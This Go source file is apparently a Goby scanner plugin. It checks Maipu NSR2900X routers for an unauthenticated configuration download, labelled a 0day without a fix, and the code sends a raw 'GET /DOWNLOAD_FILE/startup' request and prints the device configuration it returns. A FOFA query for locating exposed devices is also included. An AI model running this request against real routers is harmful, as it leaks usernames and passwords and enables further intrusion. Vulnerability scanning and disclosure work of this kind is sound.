package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "io/ioutil"
    "strings"
)

func init() {
expJson := `{
    "Name": "Maipu NSR2900X configuration file unauthorized  download",
    "Description": "<p>Maipu configuration management system is the web management interface of Maipu routers and other products, which is mainly used to configure equipment and other operations. </p><p>The system has a configuration file download vulnerability, which can reveal the device username and password.</p>",
    "Product": "maipu-NSR2900X",
    "Homepage": "http://www.maipu.cn/",
    "DisclosureDate": "2021-06-01",
    "Author": "mayi",
    "FofaQuery": "body=\"/assets/css/ui-dialog.css\" && body=\"/form/formUserLogin\"",
    "GobyQuery": "body=\"/assets/css/ui-dialog.css\" && body=\"/form/formUserLogin\"",
    "Level": "2",
    "Impact": "<p>There is a configuration file download vulnerability in Maipu configuration management system, which can leak device configuration information such as device username and password, intranet ip, etc., and attackers can use the leaked information to conduct further attacks.</p>",
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Is0day": true,
    "Recommendation": "<p>1. The official has not fixed this vulnerability yet. It is recommended that users contact the manufacturer to fix the vulnerability or pay attention to the manufacturer's homepage for solutions: <a href=\"http://www.maipu.cn/\">http://www.maipu.cn/</a></p><p>2. If not necessary, it is forbidden to access the system from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Translation": {
        "CN": {
            "Name": "迈普 NSR2900X 配置文件未授权下载",
            "Product": "maipu-NSR2900X",
            "Description": "<p>迈普配置管理系统是迈普路由器等产品的web管理界面，主要用于配置设备等操作。</p><p>该系统存在配置文件下载漏洞，可泄露设备用户名密码。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"http://www.maipu.cn/\" target=\"_blank\">http://www.maipu.cn/</a><br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>迈普配置管理系统存在配置文件下载漏洞，可泄露设备用户名密码，内网ip等设备配置信息，攻击者可利用泄露的信息进行进一步攻击。</p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "信创",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Maipu NSR2900X configuration file unauthorized  download",
            "Product": "maipu-NSR2900X",
            "Description": "<p>Maipu configuration management system is the web management interface of Maipu routers and other products, which is mainly used to configure equipment and other operations. </p><p>The system has a configuration file download vulnerability, which can reveal the device username and password.</p>",
            "Recommendation": "<p>1. The official has not fixed this vulnerability yet. It is recommended that users contact the manufacturer to fix the vulnerability or pay attention to the manufacturer's homepage for solutions: <a href=\"http://www.maipu.cn/\" target=\"_blank\">http://www.maipu.cn/</a><br></p><p>2. If not necessary, it is forbidden to access the system from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>There is a configuration file download vulnerability in Maipu configuration management system, which can leak device configuration information such as device username and password, intranet ip, etc., and attackers can use the leaked information to conduct further attacks.</p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "Information technology application innovation industry"
            ]
        }
    },
    "References": [],
    "HasExp": false,
    "ExpParams": [],
    "ScanSteps": [
        null
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "Information technology application innovation industry"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "迈普-NSR2900X"
        ]
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            //maipuhttp:=httpclient.NewGetRequestConfig("/DOWNLOAD_FILE/startup")
            //if resp, err := httpclient.DoHttpRequest(u, maipuhttp); err == nil {
            //  fmt.Printf(resp.RawBody)
            //  if strings.Contains(resp.Status, "200") && strings.Contains(resp.RawBody, "startup") && strings.Contains(resp.RawBody, "privilege"){
            //      return true
            //  }
            //}
            payload := "GET /DOWNLOAD_FILE/startup"  + " HTTP/1.1\r\nAccept-Encoding: identity\r\nConnection: close\r\n"
            payload += "Host: " +u.IP + "\r\n"
            payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\r\n\r\n"
            conn, err := httpclient.GetTCPConn(u.HostInfo)
            if err != nil {
                fmt.Printf("failed")
                return false
            }
            _, err = conn.Write([]byte(payload))
            if err != nil {
                fmt.Printf("failed")
                return false
            }
            //result := make([]byte, 4096)

            //_, err = conn.Read(result)
            //fmt.Printf(string(result))
            response, _ := ioutil.ReadAll(conn)
            fmt.Println(string(response))
            if strings.Contains(string(response), "200") && strings.Contains(string(response), "startup") && strings.Contains(string(response), "privilege") {
                return true
            }

            return false
        },
        nil,
    ))
}
//       ./goscanner -m Maipu_NSR2900X_unauth -t 172.16.14.2
